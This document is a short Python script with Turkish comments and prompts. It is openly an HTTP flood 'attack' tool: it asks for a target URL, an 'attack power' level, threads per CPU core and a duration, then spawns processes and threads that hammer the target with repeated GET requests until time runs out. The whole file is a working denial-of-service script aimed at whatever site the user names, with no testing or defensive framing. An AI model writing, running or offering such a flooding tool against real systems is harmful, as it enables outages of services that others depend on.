import threading
import time
import multiprocessing
import requests

# Bir çekirdek üzerinde daha fazla iş parçacığı ile saldırıyı hızlandırma
def send_requests_threaded(target, request_count, thread_count):
    def send_request_thread():
        for _ in range(request_count):  # Her iş parçacığı belirlenen sayıda istek yapacak
            try:
                response = requests.get(target)
                print(f"Status Code: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Hata: {e}")

    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=send_request_thread)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def start_attack():
    try:
        target = input("Hedef URL: ")
        request_count = int(input("Gönderilecek İstek Sayısı: "))
        attack_power = int(input("Saldırı Gücü (1-2-3): "))
        thread_count = int(input("İş Parçacığı Sayısı (thread) her çekirdek için: "))
        attack_duration = int(input("Saldırı Süresi (saniye): "))

        if attack_power not in [1, 2, 3]:
            print("Geçersiz saldırı gücü seçimi. Varsayılan olarak 2 seçildi.")
            attack_power = 2

        total_cores = multiprocessing.cpu_count()
        if attack_power == 1:
            cores_to_use = max(1, total_cores // 4)
        elif attack_power == 2:
            cores_to_use = max(1, total_cores // 2)
        else:
            cores_to_use = total_cores

        # Saldırı gücüne göre iş parçacığı sayısını artır
        thread_count = thread_count * attack_power

        print(f"{request_count} adet istek {target} adresine {cores_to_use} çekirdek ve her çekirdek için {thread_count} iş parçacığı kullanılarak gönderiliyor...")

        start_time = time.time()
        processes = []

        while time.time() - start_time < attack_duration:  # Saldırı süresi boyunca devam et
            for i in range(cores_to_use):
                process = multiprocessing.Process(target=send_requests_threaded, args=(target, request_count, thread_count))
                processes.append(process)
                process.start()

            for process in processes:
                process.join()

        end_time = time.time()
        duration = end_time - start_time

        print(f"Saldırı tamamlandı. Toplam süre: {duration:.2f} saniye.")
    except Exception as e:
        print(f"Hata: {e}")
        input("Devam etmek için bir tuşa basın...")

def main():
    try:
        start_attack()
    except Exception as e:
        print(f"Hata: {e}")
        input("Devam etmek için bir tuşa basın...")

if __name__ == "__main__":
    main()
